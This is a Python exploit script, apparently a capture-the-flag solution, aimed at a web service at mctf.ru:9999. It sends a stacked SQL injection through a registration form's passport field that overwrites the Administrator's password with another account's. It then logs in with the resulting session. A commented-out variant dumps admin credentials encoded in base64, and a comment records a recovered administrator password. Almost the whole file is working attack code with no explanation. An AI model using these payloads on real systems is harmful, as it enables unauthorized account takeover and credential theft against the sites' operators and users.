#!/usr/bin/env python3

# WORDLIST:	/usr/share/wordlists/rockyou.txt

# import requests
# from urllib.parse import quote, unquote			#unquote("%2F")		quote("\")
# from html import unescape
# from hashlib import md5

# from pwn import *
# from json import dumps							#dumps({"key":"value"})
# from os import system

# import string

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


import requests
import re
from random import randint


link = "http://mctf.ru:9999/"

def main():
	s = requests.Session()

	# query = "SELECT encode((SELECT passport ||':'|| password FROM \"user\" WHERE passport='Administrator')::bytea, 'base64')"
	# payload = f"'; UPDATE \"user_info\" SET full_name=({query}) WHERE passport='777'; -- "

	payload = f"'; UPDATE \"user\" SET password=(SELECT password FROM \"user\" WHERE passport='1337-313370') WHERE passport='Administrator'; -- "

	# Administrator:123123LOLhehe1337

	passport = payload
	psw = 777

	# print(passport, psw)

	resp = s.post(link + "registration", data={
		'passport':passport,
		'fio':'Test',
		'psw':psw
	}).text
	
	resp = s.post(link + "doLogin", data={
		'passport':passport,
		'psw':psw
	}).text
	print( s.cookies.get_dict() )


	resp = s.post(link+"personal/profile/save_user_data", data={
		'NAME':'',
		'LAST_NAME':'',
		'SECOND_NAME':''
	}).text
	print(resp)


if __name__ == "__main__":
    main()
